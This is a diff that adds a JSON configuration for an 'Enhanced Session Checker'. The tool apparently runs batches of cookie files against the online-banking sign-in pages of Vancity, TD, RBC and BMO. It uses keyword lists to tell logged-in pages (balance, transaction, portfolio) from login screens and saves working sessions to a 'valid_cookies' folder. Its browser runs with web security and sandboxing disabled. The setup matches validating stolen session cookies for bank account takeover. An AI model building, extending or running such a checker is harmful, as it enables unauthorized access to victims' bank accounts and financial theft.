@@ -1,0 +1,70 @@
+{
+  "version": "2.0",
+  "description": "Enhanced Session Checker Configuration",
+  
+  "performance": {
+    "maxRetries": 2,
+    "pageTimeout": 20000,
+    "maxConcurrentPages": 3,
+    "batchSize": 20
+  },
+  
+  "features": {
+    "screenshotOnSuccess": false,
+    "exportJson": true,
+    "checkExpiration": true,
+    "skipSmallFiles": true,
+    "minFileSize": 100
+  },
+  
+  "detection": {
+    "confidenceThreshold": 50,
+    "mixedModeThreshold": 70,
+    "useAdvancedHeuristics": true
+  },
+  
+  "customDomains": {
+    "banking.vancity.com": "https://banking.vancity.com/cgi-bin/sessmgmt?NEXTPAGE=FMS_MENU",
+    "online.td.com": "https://authentication.td.com/uap-ui/authentication/td?execution=e1s1",
+    "www1.royalbank.com": "https://www1.royalbank.com/cgi-bin/rbaccess/rbunxcgi?F6=1&F7=IB&F21=IB&F22=1&REQUEST=ClientSignin",
+    "www.bmo.com": "https://www.bmo.com/main/personal/online-banking/"
+  },
+  
+  "loginKeywords": [
+    "sign in", "log in", "login", "password", "forgot password",
+    "enter your password", "authentication", "two-factor", "2fa",
+    "create account", "register", "signin", "log out", "logout",
+    "welcome back", "sign up", "verify", "access denied", "unauthorized"
+  ],
+  
+  "loggedInKeywords": [
+    "dashboard", "profile", "settings", "account", "logout", "sign out",
+    "welcome", "my account", "notifications", "messages", "feed",
+    "timeline", "inbox", "compose", "upload", "post", "balance",
+    "transaction", "statement", "portfolio", "investment"
+  ],
+  
+  "browserOptions": {
+    "headless": "auto",
+    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "viewport": {
+      "width": 1920,
+      "height": 1080
+    },
+    "args": [
+      "--no-sandbox",
+      "--disable-setuid-sandbox", 
+      "--disable-dev-shm-usage",
+      "--disable-web-security",
+      "--disable-features=site-per-process"
+    ]
+  },
+  
+  "output": {
+    "validCookiesDir": "valid_cookies",
+    "screenshotsDir": "screenshots",
+    "logFileName": "session_log_enhanced.txt",
+    "jsonFileName": "session_results.json",
+    "csvFileName": "session_results.csv"
+  }
+}
